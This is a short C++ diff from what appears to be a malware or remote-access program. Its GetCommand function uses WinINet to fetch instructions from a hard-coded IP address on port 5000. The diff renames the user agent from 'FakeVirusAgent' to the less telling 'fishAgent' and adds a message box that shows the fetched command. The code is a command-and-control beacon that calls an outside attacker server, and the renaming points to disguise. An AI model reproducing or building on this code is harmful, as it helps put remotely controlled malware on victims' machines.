@@ -47,7 +47,7 @@ void ShowMessage() {
 string GetCommand() {
     string command;
 
-    HINTERNET hInternet = InternetOpenA("FakeVirusAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
 
         HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
@@ -63,6 +63,7 @@ string GetCommand() {
         }
         InternetCloseHandle(hInternet);
     }
+    MessageBox(NULL, TEXT(command), TEXT("Alerte"), MB_OK);
     return command;
 }
 
